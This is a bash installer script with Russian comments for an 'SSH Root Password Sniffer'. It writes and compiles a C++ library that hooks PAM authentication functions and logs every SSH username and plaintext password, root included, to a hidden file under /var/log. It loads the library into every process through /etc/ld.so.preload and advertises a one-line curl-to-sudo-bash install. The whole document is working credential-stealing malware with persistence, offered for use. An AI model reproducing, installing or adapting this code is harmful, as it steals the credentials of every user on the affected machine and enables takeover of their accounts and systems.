#!/bin/bash

# SSH Root Password Sniffer Quick Installer
# Можно запустить одной командой:
# curl -s https://example.com/root_quick_install.sh | sudo bash

# Проверка наличия прав root
if [ "$(id -u)" != "0" ]; then
    echo "Этот скрипт должен быть запущен с правами root"
    echo "Используйте: curl -s URL | sudo bash"
    exit 1
fi

# Создаем временную директорию
TEMP_DIR=$(mktemp -d)
cd "$TEMP_DIR" || exit 1

echo "SSH Root Password Sniffer - Быстрая установка"
echo "==========================================="

# Создаем исходный код
echo "[1/4] Создание исходного кода..."
cat > root_inject.cpp << 'EOL'
/**
 * Системный SSH Password Sniffer
 * Перехватывает все SSH пароли, включая root
 */

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <security/pam_appl.h>
#include <time.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

// Путь к лог-файлу
#define LOG_PATH "/var/log/.ssh_passwd.log"

// Оригинальные функции PAM
static int (*orig_pam_get_item)(const pam_handle_t *pamh, int item_type, const void **item) = NULL;
static int (*orig_pam_authenticate)(pam_handle_t *pamh, int flags) = NULL;
static int (*orig_pam_set_item)(pam_handle_t *pamh, int item_type, const void *item) = NULL;

// Буферы для информации об авторизации
static char last_username[256] = {0};
static char last_password[1024] = {0};
static int auth_result = 0;

// Записываем логи в скрытый файл
void log_auth_data() {
    // Получаем текущее время
    time_t now = time(NULL);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    // Получаем информацию о процессе
    pid_t pid = getpid();
    char cmdline[1024] = "unknown";
    char process_path[256] = {0};
    
    // Попытка получить командную строку
    snprintf(process_path, sizeof(process_path), "/proc/%d/cmdline", pid);
    FILE* cmd_file = fopen(process_path, "r");
    if (cmd_file) {
        size_t size = fread(cmdline, 1, sizeof(cmdline) - 1, cmd_file);
        if (size > 0) {
            // Заменяем нулевые байты на пробелы
            for (size_t i = 0; i < size - 1; i++) {
                if (cmdline[i] == '\0') cmdline[i] = ' ';
            }
            cmdline[size] = '\0';
        }
        fclose(cmd_file);
    }
    
    // Создаем запись в лог
    FILE* log = fopen(LOG_PATH, "a");
    if (log) {
        fprintf(log, "==== SSH AUTH CAPTURE [%s] ====\n", timestamp);
        fprintf(log, "Process: %s (PID: %d)\n", cmdline, pid);
        fprintf(log, "Username: %s\n", last_username);
        fprintf(log, "Password: %s\n", last_password);
        fprintf(log, "Result: %s\n", auth_result ? "SUCCESS" : "FAILED");
        fprintf(log, "===============================\n\n");
        fclose(log);
        
        // Устанавливаем безопасные права доступа
        chmod(LOG_PATH, 0600);
    }
}

// Перехват pam_get_item - для получения имени пользователя
extern "C" int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
    if (!orig_pam_get_item) {
        orig_pam_get_item = (int(*)(const pam_handle_t*, int, const void**))dlsym(RTLD_NEXT, "pam_get_item");
        if (!orig_pam_get_item) return PAM_SYSTEM_ERR;
    }
    
    int result = orig_pam_get_item(pamh, item_type, item);
    
    // Сохраняем имя пользователя
    if (item_type == PAM_USER && result == PAM_SUCCESS && *item != NULL) {
        strncpy(last_username, (const char*)*item, sizeof(last_username) - 1);
        last_username[sizeof(last_username) - 1] = '\0';
    }
    
    return result;
}

// Перехват pam_set_item - для получения пароля
extern "C" int pam_set_item(pam_handle_t *pamh, int item_type, const void *item) {
    if (!orig_pam_set_item) {
        orig_pam_set_item = (int(*)(pam_handle_t*, int, const void*))dlsym(RTLD_NEXT, "pam_set_item");
        if (!orig_pam_set_item) return PAM_SYSTEM_ERR;
    }
    
    // Сохраняем пароль
    if (item_type == PAM_AUTHTOK && item != NULL) {
        strncpy(last_password, (const char*)item, sizeof(last_password) - 1);
        last_password[sizeof(last_password) - 1] = '\0';
    }
    
    return orig_pam_set_item(pamh, item_type, item);
}

// Перехват pam_authenticate - для определения результата
extern "C" int pam_authenticate(pam_handle_t *pamh, int flags) {
    if (!orig_pam_authenticate) {
        orig_pam_authenticate = (int(*)(pam_handle_t*, int))dlsym(RTLD_NEXT, "pam_authenticate");
        if (!orig_pam_authenticate) return PAM_SYSTEM_ERR;
    }
    
    // Вызываем оригинальную функцию
    int result = orig_pam_authenticate(pamh, flags);
    
    // Если у нас уже есть имя пользователя и пароль
    if (last_username[0] != '\0' && last_password[0] != '\0') {
        auth_result = (result == PAM_SUCCESS);
        log_auth_data();
        
        // Очищаем буферы (для безопасности)
        memset(last_password, 0, sizeof(last_password));
    }
    
    return result;
}

// Функция инициализации
static __attribute__((constructor)) void init(void) {
    // Убеждаемся, что лог-файл существует и имеет правильные права
    FILE* log = fopen(LOG_PATH, "a");
    if (log) {
        fprintf(log, "=== SSH Password Sniffer loaded (PID: %d) ===\n", getpid());
        fclose(log);
        chmod(LOG_PATH, 0600);
    }
}

// Функция деинициализации
static __attribute__((destructor)) void fini(void) {
    // Очищаем чувствительные данные
    memset(last_username, 0, sizeof(last_username));
    memset(last_password, 0, sizeof(last_password));
}
EOL

# Создаем скрипт удаления
cat > remove.sh << 'EOL'
#!/bin/bash

# Удаление SSH Root Password Sniffer
if [ "$(id -u)" != "0" ]; then
    echo "Для удаления нужны права root"
    exit 1
fi

echo "Удаление SSH Root Password Sniffer..."

# Удаление из /etc/ld.so.preload
if [ -f "/etc/ld.so.preload" ]; then
    grep -v "libssh_root_inject.so" /etc/ld.so.preload > /tmp/ld.so.preload.tmp
    if [ -s "/tmp/ld.so.preload.tmp" ]; then
        # Если файл не пустой, копируем его обратно
        cp /tmp/ld.so.preload.tmp /etc/ld.so.preload
    else
        # Если файл пустой, удаляем его
        rm -f /etc/ld.so.preload
    fi
    rm -f /tmp/ld.so.preload.tmp
fi

# Удаление библиотеки
rm -f /usr/lib/libssh_root_inject.so

echo "Перехватчик удален. Лог-файл: /var/log/.ssh_passwd.log"
EOL

chmod +x remove.sh

# Компиляция
echo "[2/4] Компиляция..."
g++ -shared -fPIC -std=c++11 -Wall -O2 -o libssh_root_inject.so root_inject.cpp -ldl

if [ ! -f "libssh_root_inject.so" ]; then
    echo "Ошибка компиляции. Установка необходимых зависимостей..."
    apt-get update
    apt-get install -y g++ libpam-dev
    
    # Повторная попытка компиляции
    g++ -shared -fPIC -std=c++11 -Wall -O2 -o libssh_root_inject.so root_inject.cpp -ldl
    
    if [ ! -f "libssh_root_inject.so" ]; then
        echo "Ошибка компиляции. Убедитесь, что g++ и libpam-dev установлены правильно."
        exit 1
    fi
fi

# Установка
echo "[3/4] Установка..."
cp libssh_root_inject.so /usr/lib/
touch /var/log/.ssh_passwd.log
chmod 600 /var/log/.ssh_passwd.log

# Копирование remove.sh
cp remove.sh /usr/local/bin/remove_ssh_sniffer
chmod +x /usr/local/bin/remove_ssh_sniffer

# Настройка системного предзагрузчика
echo "[4/4] Активация перехватчика..."
if [ -f "/etc/ld.so.preload" ]; then
    # Если файл существует, добавляем нашу библиотеку
    if ! grep -q "libssh_root_inject.so" /etc/ld.so.preload; then
        echo "/usr/lib/libssh_root_inject.so" >> /etc/ld.so.preload
    fi
else
    # Если файла нет, создаем его
    echo "/usr/lib/libssh_root_inject.so" > /etc/ld.so.preload
fi
chmod 644 /etc/ld.so.preload

# Очистка
cd /
rm -rf "$TEMP_DIR"

echo "Установка завершена!"
echo "Перехватчик паролей активирован для всех пользователей, включая root."
echo "Пароли будут записываться в: /var/log/.ssh_passwd.log"
echo ""
echo "Для удаления: sudo /usr/local/bin/remove_ssh_sniffer" 